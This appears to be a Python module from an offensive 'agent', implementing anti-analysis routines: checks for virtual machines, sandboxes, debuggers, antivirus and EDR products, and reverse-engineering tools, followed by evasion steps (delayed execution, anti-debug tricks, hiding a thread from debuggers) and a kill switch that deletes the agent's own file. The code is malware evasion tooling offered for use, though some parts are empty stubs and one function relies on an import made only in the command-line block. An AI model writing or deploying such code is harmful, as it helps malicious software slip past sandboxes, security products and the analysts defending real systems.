#!/usr/bin/env python3
"""
ANTI-ANALYSIS - Detection avoidance for VM, Sandbox, Debug, AV.
Protects agent from analysis and reverse engineering.
"""

import os
import sys
import json
import time
import platform
import subprocess
import threading
import hashlib
import base64
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from pathlib import Path

class AntiAnalysis:
    """Detect and evade analysis environments."""
    
    def __init__(self):
        self.platform = platform.system().lower()
        self.detected = {
            "vm": False,
            "sandbox": False,
            "debug": False,
            "av": False,
            "monitor": False,
            "analysis_tools": []
        }
        self.evasion_active = False
        self.kill_switch = False
    
    # ─── VM DETECTION ──────────────────────────────────────────────────
    
    def detect_vm(self) -> Dict:
        """Detect virtual machine environment."""
        result = {"detected": False, "indicators": []}
        
        # VM signatures
        vm_signatures = {
            "cpu": [
                "VMware", "VBOX", "VirtualBox", "QEMU", "KVM", "Xen",
                "Microsoft Corporation Virtual", "Parallels", "Bochs"
            ],
            "mac_address": [
                "00:0C:29", "00:50:56", "00:05:69",  # VMware
                "08:00:27", "0A:00:27",  # VirtualBox
                "00:1C:42",  # Parallels
                "00:16:3E",  # Xen
                "52:54:00",  # QEMU/KVM
            ],
            "registry": [
                "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
                "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
                "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
                "SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
                "SYSTEM\\CurrentControlSet\\Services\\VMTools",
                "SYSTEM\\CurrentControlSet\\Services\\vmicheartbeat",
            ],
            "files": [
                "/sys/class/dmi/id/product_name",
                "/sys/class/dmi/id/sys_vendor",
                "/sys/hypervisor/properties/capabilities",
                "C:\\Windows\\System32\\drivers\\vmmouse.sys",
                "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
                "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
                "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
            ],
            "processes": [
                "vmtoolsd", "vmwaretray", "vmwareuser", "VGAuthService",
                "VBoxService", "VBoxTray", "qemu-ga", "xenstore",
            ],
        }
        
        # Check CPU info
        try:
            if self.platform == "linux":
                with open("/proc/cpuinfo", "r") as f:
                    cpuinfo = f.read()
                for sig in vm_signatures["cpu"]:
                    if sig.lower() in cpuinfo.lower():
                        result["detected"] = True
                        result["indicators"].append(f"CPU: {sig}")
            
            elif self.platform == "windows":
                import wmi
                c = wmi.WMI()
                for cpu in c.Win32_Processor():
                    for sig in vm_signatures["cpu"]:
                        if sig.lower() in cpu.Name.lower():
                            result["detected"] = True
                            result["indicators"].append(f"CPU: {sig}")
        except:
            pass
        
        # Check MAC addresses
        try:
            if self.platform == "linux":
                result_run = subprocess.run(
                    ["ip", "link"], capture_output=True, text=True, timeout=5
                )
                output = result_run.stdout.lower()
                for mac_prefix in vm_signatures["mac_address"]:
                    if mac_prefix.lower() in output:
                        result["detected"] = True
                        result["indicators"].append(f"MAC: {mac_prefix}")
            
            elif self.platform == "windows":
                import wmi
                c = wmi.WMI()
                for nic in c.Win32_NetworkAdapterConfiguration():
                    mac = nic.MACAddress
                    if mac:
                        for mac_prefix in vm_signatures["mac_address"]:
                            if mac.startswith(mac_prefix):
                                result["detected"] = True
                                result["indicators"].append(f"MAC: {mac_prefix}")
        except:
            pass
        
        # Check DMI info (Linux)
        try:
            for filepath in ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"]:
                if os.path.exists(filepath):
                    with open(filepath, "r") as f:
                        content = f.read().lower()
                    for sig in vm_signatures["cpu"]:
                        if sig.lower() in content:
                            result["detected"] = True
                            result["indicators"].append(f"DMI: {filepath}")
        except:
            pass
        
        # Check hypervisor (Linux)
        try:
            if os.path.exists("/sys/hypervisor/properties/capabilities"):
                result["detected"] = True
                result["indicators"].append("Hypervisor detected")
        except:
            pass
        
        # Check registry (Windows)
        if self.platform == "windows":
            try:
                import winreg
                for reg_path in vm_signatures["registry"]:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                        winreg.CloseKey(key)
                        result["detected"] = True
                        result["indicators"].append(f"Registry: {reg_path}")
                    except:
                        pass
            except:
                pass
        
        # Check files
        for filepath in vm_signatures["files"]:
            if os.path.exists(filepath):
                result["detected"] = True
                result["indicators"].append(f"File: {filepath}")
        
        # Check processes
        try:
            result_run = subprocess.run(
                ["ps", "aux"] if self.platform == "linux" else ["tasklist"],
                capture_output=True, text=True, timeout=5
            )
            output = result_run.stdout.lower()
            for proc in vm_signatures["processes"]:
                if proc.lower() in output:
                    result["detected"] = True
                    result["indicators"].append(f"Process: {proc}")
        except:
            pass
        
        self.detected["vm"] = result["detected"]
        return result
    
    # ─── SANDBOX DETECTION ────────────────────────────────────────────
    
    def detect_sandbox(self) -> Dict:
        """Detect sandbox environment."""
        result = {"detected": False, "indicators": []}
        
        # Sandbox indicators
        sandbox_indicators = {
            "usernames": [
                "sandbox", "malware", "virus", "sample", "test", "analysis",
                "vmware", "vbox", "joe", "cuckoo", "anubis", "threatexpert",
            ],
            "hostnames": [
                "sandbox", "malware", "virus", "sample", "test", "analysis",
                "vmware", "vbox", "cuckoo", "joesandbox", "virustotal",
            ],
            "directories": [
                "/tmp/sandbox", "/tmp/virus", "/tmp/malware",
                "C:\\sandbox", "C:\\virus", "C:\\malware",
                "/usr/share/sandbox",
            ],
            "files": [
                "/.dockerenv", "/.dockerinit",
                "/tmp/.X0-lock", "/tmp/.X11-unix",
                "C:\\analysis", "C:\\sandbox",
            ],
            "env_vars": [
                "SANDBOX", "MALWARE", "ANALYSIS", "SAMPLE",
                "AUTOMATED_ANALYSIS", "VIRUS_TOTAL",
            ],
        }
        
        # Check username
        try:
            import getpass
            username = getpass.getuser().lower()
            for indicator in sandbox_indicators["usernames"]:
                if indicator in username:
                    result["detected"] = True
                    result["indicators"].append(f"Username: {username}")
        except:
            pass
        
        # Check hostname
        try:
            hostname = platform.node().lower()
            for indicator in sandbox_indicators["hostnames"]:
                if indicator in hostname:
                    result["detected"] = True
                    result["indicators"].append(f"Hostname: {hostname}")
        except:
            pass
        
        # Check directories
        for directory in sandbox_indicators["directories"]:
            if os.path.exists(directory):
                result["detected"] = True
                result["indicators"].append(f"Directory: {directory}")
        
        # Check files
        for filepath in sandbox_indicators["files"]:
            if os.path.exists(filepath):
                result["detected"] = True
                result["indicators"].append(f"File: {filepath}")
        
        # Check environment variables
        for env_var in sandbox_indicators["env_vars"]:
            if os.environ.get(env_var):
                result["detected"] = True
                result["indicators"].append(f"Env: {env_var}")
        
        # Check for low memory (common in sandboxes)
        try:
            if self.platform == "linux":
                with open("/proc/meminfo", "r") as f:
                    meminfo = f.read()
                for line in meminfo.split("\n"):
                    if line.startswith("MemTotal:"):
                        mem_kb = int(line.split()[1])
                        if mem_kb < 2 * 1024 * 1024:  # Less than 2GB
                            result["detected"] = True
                            result["indicators"].append(f"Low memory: {mem_kb // 1024}MB")
                        break
        except:
            pass
        
        # Check for few processes (sandboxes often have minimal processes)
        try:
            result_run = subprocess.run(
                ["ps", "aux"] if self.platform == "linux" else ["tasklist"],
                capture_output=True, text=True, timeout=5
            )
            process_count = len(result_run.stdout.strip().split("\n"))
            if process_count < 30:  # Normal system has 50+ processes
                result["detected"] = True
                result["indicators"].append(f"Few processes: {process_count}")
        except:
            pass
        
        # Timing checks
        if self._timing_check():
            result["detected"] = True
            result["indicators"].append("Timing anomaly detected")
        
        # Mouse movement check (sandboxes often have no mouse activity)
        if self._mouse_activity_check():
            result["detected"] = True
            result["indicators"].append("No mouse activity")
        
        self.detected["sandbox"] = result["detected"]
        return result
    
    def _timing_check(self) -> bool:
        """Check for timing anomalies (RDTSC detection)."""
        try:
            import time
            
            # Measure time twice
            start = time.perf_counter()
            time.sleep(0.1)
            end = time.perf_counter()
            
            elapsed = end - start
            
            # If elapsed time is significantly different from expected
            if abs(elapsed - 0.1) > 0.05:  # 50ms tolerance
                return True
            
            # Check for RDTSC emulation
            try:
                start_rdtsc = time.perf_counter_ns()
                for _ in range(1000):
                    pass
                end_rdtsc = time.perf_counter_ns()
                
                # If variance is too high, might be emulated
                variance = abs((end_rdtsc - start_rdtsc) - 1000000)  # ~1ms expected
                if variance > 500000:  # 0.5ms variance
                    return True
            except:
                pass
        
        except:
            pass
        
        return False
    
    def _mouse_activity_check(self) -> bool:
        """Check for mouse activity (no activity = sandbox)."""
        try:
            if self.platform == "linux":
                # Check /dev/input/mice
                if os.path.exists("/dev/input/mice"):
                    return False  # Mouse device exists
                return True
            
            elif self.platform == "windows":
                import ctypes
                from ctypes import wintypes
                
                user32 = ctypes.windll.user32
                
                # Get last input time
                class LASTINPUTINFO(ctypes.Structure):
                    _fields_ = [
                        ("cbSize", wintypes.DWORD),
                        ("dwTime", wintypes.DWORD)
                    ]
                
                info = LASTINPUTINFO()
                info.cbSize = ctypes.sizeof(info)
                
                if user32.GetLastInputInfo(ctypes.byref(info)):
                    idle_time = (ctypes.windll.kernel32.GetTickCount() - info.dwTime) // 1000
                    if idle_time > 300:  # 5 minutes idle
                        return True
        
        except:
            pass
        
        return False
    
    # ─── DEBUG DETECTION ──────────────────────────────────────────────
    
    def detect_debug(self) -> Dict:
        """Detect debugger presence."""
        result = {"detected": False, "indicators": []}
        
        # Linux debug detection
        if self.platform == "linux":
            # Check /proc/self/status for TracerPid
            try:
                with open("/proc/self/status", "r") as f:
                    for line in f:
                        if line.startswith("TracerPid:"):
                            tracer_pid = int(line.split()[1])
                            if tracer_pid != 0:
                                result["detected"] = True
                                result["indicators"].append(f"TracerPid: {tracer_pid}")
                            break
            except:
                pass
            
            # Check for ptrace
            try:
                import ctypes
                libc = ctypes.CDLL("libc.so.6")
                
                # PTRACE_TRACEME would fail if already traced
                if libc.ptrace(0, 0, 0, 0) == -1:
                    result["detected"] = True
                    result["indicators"].append("ptrace detected")
            except:
                pass
            
            # Check for debugger processes
            try:
                debugger_procs = ["gdb", "lldb", "strace", "ltrace", "frida"]
                result_run = subprocess.run(
                    ["ps", "aux"], capture_output=True, text=True, timeout=5
                )
                output = result_run.stdout.lower()
                for proc in debugger_procs:
                    if proc in output:
                        result["detected"] = True
                        result["indicators"].append(f"Debugger process: {proc}")
            except:
                pass
        
        # Windows debug detection
        elif self.platform == "windows":
            try:
                import ctypes
                from ctypes import wintypes
                
                kernel32 = ctypes.windll.kernel32
                
                # CheckRemoteDebuggerPresent
                is_debugged = wintypes.BOOL()
                if kernel32.CheckRemoteDebuggerPresent(
                    kernel32.GetCurrentProcess(),
                    ctypes.byref(is_debugged)
                ):
                    if is_debugged:
                        result["detected"] = True
                        result["indicators"].append("Remote debugger detected")
                
                # IsDebuggerPresent
                if kernel32.IsDebuggerPresent():
                    result["detected"] = True
                    result["indicators"].append("Debugger present")
                
                # NtGlobalFlag
                try:
                    peb = ctypes.windll.ntdll.NtCurrentTeb()
                    if peb:
                        nt_global_flag = ctypes.c_uint32.from_address(
                            ctypes.addressof(peb) + 0x68
                        ).value
                        if nt_global_flag & 0x70:  # FLG_HEAP_ENABLE_TAIL_CHECK, etc.
                            result["detected"] = True
                            result["indicators"].append("NtGlobalFlag set")
                except:
                    pass
            
            except:
                pass
        
        # Check for breakpoint instructions
        if self._check_breakpoints():
            result["detected"] = True
            result["indicators"].append("Breakpoints detected")
        
        self.detected["debug"] = result["detected"]
        return result
    
    def _check_breakpoints(self) -> bool:
        """Check for software breakpoints in code."""
        try:
            # Get current function address
            import ctypes
            
            # This is a simplified check
            # Real implementation would scan code sections for INT3 (0xCC)
            
            if self.platform == "linux":
                # Check /proc/self/mem for INT3 instructions
                try:
                    with open("/proc/self/maps", "r") as f:
                        for line in f:
                            if "r-x" in line:  # Executable region
                                parts = line.split()
                                start, end = parts[0].split("-")
                                start = int(start, 16)
                                end = int(end, 16)
                                
                                # Would scan this region for 0xCC
                                pass
                except:
                    pass
        
        except:
            pass
        
        return False
    
    # ─── AV/EDR DETECTION ─────────────────────────────────────────────
    
    def detect_av_edr(self) -> Dict:
        """Detect antivirus and EDR solutions."""
        result = {"detected": False, "products": []}
        
        av_processes = {
            "windows": [
                "MsMpEng", "NisSrv", "MpCmdRun",  # Windows Defender
                "avp", "kav", "avscan",  # Kaspersky
                "avg", "avgrsa", "avgrsx",  # AVG
                "avast", "AvastSvc", "AvastUI",  # Avast
                "mbam", "mbamtray", "mbamservice",  # Malwarebytes
                "NortonSecurity", "nsWscSvc",  # Norton
                "Mcafee", "Mcshield", "mfeann",  # McAfee
                "sophos", "savservice",  # Sophos
                "csagent", "csfalconservice",  # CrowdStrike
                "Tanium", "TaniumClient",  # Tanium
                "Cb", "CbDefense", "CarbonBlack",  # Carbon Black
                "SentinelAgent", "SentinelHelper",  # SentinelOne
                "Sysmon", "Sysmon64",  # Sysmon
            ],
            "linux": [
                "clamd", "freshclam",  # ClamAV
                "sophos-av", "sav-protect",  # Sophos
                "f-secure", "fsav",  # F-Secure
                "esets", "eset_efs",  # ESET
                "crowdstrike", "falcon-sensor",  # CrowdStrike
                "carbonblack", "cbagent",  # Carbon Black
                "sysmon", "sysmon64",  # Sysmon
            ]
        }
        
        try:
            result_run = subprocess.run(
                ["ps", "aux"] if self.platform == "linux" else ["tasklist"],
                capture_output=True, text=True, timeout=10
            )
            output = result_run.stdout.lower()
            
            for proc in av_processes.get(self.platform, []):
                if proc.lower() in output:
                    result["detected"] = True
                    result["products"].append(proc)
        
        except:
            pass
        
        # Check for AV files (Windows)
        if self.platform == "windows":
            av_paths = [
                "C:\\Program Files\\Windows Defender",
                "C:\\Program Files (x86)\\Kaspersky Lab",
                "C:\\Program Files\\AVG",
                "C:\\Program Files\\Avast Software",
                "C:\\Program Files\\Malwarebytes",
                "C:\\Program Files\\Norton Security",
                "C:\\Program Files\\McAfee",
                "C:\\Program Files\\CrowdStrike",
                "C:\\Program Files\\SentinelOne",
            ]
            
            for path in av_paths:
                if os.path.exists(path):
                    result["detected"] = True
                    result["products"].append(path)
        
        self.detected["av"] = result["detected"]
        return result
    
    # ─── ANALYSIS TOOLS DETECTION ────────────────────────────────────
    
    def detect_analysis_tools(self) -> Dict:
        """Detect reverse engineering and analysis tools."""
        result = {"detected": False, "tools": []}
        
        tools = [
            # Debuggers
            "gdb", "lldb", "x64dbg", "x32dbg", "ollydbg", "ida", "ida64",
            "cheatengine", "immunity", "windbg", "radare2", "r2",
            # Disassemblers
            "ghidra", "binary_ninja", "hopper", "cutter",
            # Network tools
            "wireshark", "tcpdump", "fiddler", "burpsuite", "charles",
            # Monitoring
            "procmon", "processhacker", "procexp", "sysinternals",
            "htop", "atop", "iotop", "strace", "ltrace",
            # Frida
            "frida", "frida-server", "frida-agent",
            # Sandbox
            "cuckoo", "joebox", "anubis", "threatexpert",
        ]
        
        try:
            result_run = subprocess.run(
                ["ps", "aux"] if self.platform == "linux" else ["tasklist"],
                capture_output=True, text=True, timeout=10
            )
            output = result_run.stdout.lower()
            
            for tool in tools:
                if tool.lower() in output:
                    result["detected"] = True
                    result["tools"].append(tool)
        
        except:
            pass
        
        # Check for network monitoring (promiscuous mode)
        try:
            if self.platform == "linux":
                result_run = subprocess.run(
                    ["ip", "link"], capture_output=True, text=True, timeout=5
                )
                if "PROMISC" in result_run.stdout:
                    result["detected"] = True
                    result["tools"].append("promiscuous_mode")
        except:
            pass
        
        self.detected["analysis_tools"] = result["tools"]
        return result
    
    # ─── EVASION TECHNIQUES ───────────────────────────────────────────
    
    def evade_detection(self) -> Dict:
        """Apply evasion techniques if detected."""
        result = {"actions": []}
        
        if self.detected["vm"] or self.detected["sandbox"]:
            # Delay execution
            result["actions"].append("delay_execution")
            time.sleep(random.randint(30, 120))
        
        if self.detected["debug"]:
            # Anti-debug techniques
            result["actions"].append("anti_debug")
            self._anti_debug()
        
        if self.detected["av"]:
            # AV evasion
            result["actions"].append("av_evasion")
            self._av_evasion()
        
        self.evasion_active = True
        return result
    
    def _anti_debug(self):
        """Apply anti-debugging techniques."""
        if self.platform == "linux":
            try:
                import ctypes
                libc = ctypes.CDLL("libc.so.6")
                
                # Fork to escape ptrace
                pid = os.fork()
                if pid == 0:
                    # Child process
                    libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
                else:
                    # Parent exits
                    sys.exit(0)
            except:
                pass
        
        elif self.platform == "windows":
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                
                # Anti-debug: NtSetInformationThread
                try:
                    ntdll = ctypes.windll.ntdll
                    THREAD_HIDE_FROM_DEBUGGER = 0x11
                    ntdll.NtSetInformationThread(
                        kernel32.GetCurrentThread(),
                        THREAD_HIDE_FROM_DEBUGGER,
                        None, 0
                    )
                except:
                    pass
                
                # Anti-debug: OutputDebugString
                kernel32.OutputDebugStringW("Anti-debug check")
                if kernel32.GetLastError() == 0:
                    # Debugger might be present
                    pass
            except:
                pass
    
    def _av_evasion(self):
        """Apply AV evasion techniques."""
        # Process hollowing simulation (would need actual implementation)
        # Memory obfuscation
        # API unhooking
        
        pass
    
    # ─── KILL SWITCH ─────────────────────────────────────────────────
    
    def check_kill_switch(self) -> bool:
        """Check if agent should self-destruct."""
        # Multiple detection = kill switch
        detections = sum([
            self.detected["vm"],
            self.detected["sandbox"],
            self.detected["debug"],
            self.detected["av"],
        ])
        
        if detections >= 3:
            self.kill_switch = True
            return True
        
        return False
    
    def self_destruct(self):
        """Self-destruct the agent."""
        try:
            # Delete agent files
            agent_path = os.path.abspath(__file__)
            if os.path.exists(agent_path):
                os.unlink(agent_path)
            
            # Clear persistence
            # (would need to implement persistence removal)
            
            # Exit
            sys.exit(0)
        except:
            sys.exit(1)
    
    # ─── MASTER CHECK ────────────────────────────────────────────────
    
    def check_all(self) -> Dict:
        """Run all detection checks."""
        results = {
            "timestamp": datetime.now().isoformat(),
            "platform": self.platform,
            "hostname": platform.node(),
            "checks": {}
        }
        
        print("[*] Running anti-analysis checks...")
        
        # VM detection
        print("[*] Checking for VM...")
        results["checks"]["vm"] = self.detect_vm()
        
        # Sandbox detection
        print("[*] Checking for sandbox...")
        results["checks"]["sandbox"] = self.detect_sandbox()
        
        # Debug detection
        print("[*] Checking for debugger...")
        results["checks"]["debug"] = self.detect_debug()
        
        # AV/EDR detection
        print("[*] Checking for AV/EDR...")
        results["checks"]["av_edr"] = self.detect_av_edr()
        
        # Analysis tools
        print("[*] Checking for analysis tools...")
        results["checks"]["analysis_tools"] = self.detect_analysis_tools()
        
        # Summary
        results["summary"] = {
            "vm_detected": self.detected["vm"],
            "sandbox_detected": self.detected["sandbox"],
            "debug_detected": self.detected["debug"],
            "av_detected": self.detected["av"],
            "analysis_tools": len(self.detected["analysis_tools"]),
            "total_detections": sum(self.detected.values()) if isinstance(self.detected, dict) else 0
        }
        
        # Kill switch check
        results["kill_switch"] = self.check_kill_switch()
        
        return results
    
    def to_json(self, indent: int = 2) -> str:
        """Export results to JSON."""
        return json.dumps({
            "detected": self.detected,
            "evasion_active": self.evasion_active,
            "kill_switch": self.kill_switch
        }, indent=indent, default=str)


# ─── CLI Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    import random
    
    parser = argparse.ArgumentParser(description="Anti-Analysis")
    parser.add_argument("--check", "-c", action="store_true", help="Run all checks")
    parser.add_argument("--evade", "-e", action="store_true", help="Apply evasion")
    parser.add_argument("--json", "-j", action="store_true", help="Output as JSON")
    
    args = parser.parse_args()
    
    anti = AntiAnalysis()
    
    if args.check:
        results = anti.check_all()
        
        if args.json:
            print(json.dumps(results, indent=2, default=str))
        else:
            print("\n=== ANALYSIS ENVIRONMENT CHECK ===")
            for check, data in results["checks"].items():
                detected = data.get("detected", False) or len(data.get("products", data.get("tools", []))) > 0
                status = "⚠️ DETECTED" if detected else "✓ Clear"
                print(f"  {check}: {status}")
                if detected and isinstance(data, dict):
                    for key, value in data.items():
                        if value and key != "detected":
                            print(f"    - {key}: {value}")
            
            print(f"\nTotal detections: {results['summary']['total_detections']}")
            
            if results["kill_switch"]:
                print("\n⚠️ KILL SWITCH ACTIVATED - Too many detections")
    
    if args.evade:
        anti.evade_detection()
        print("[*] Evasion techniques applied")
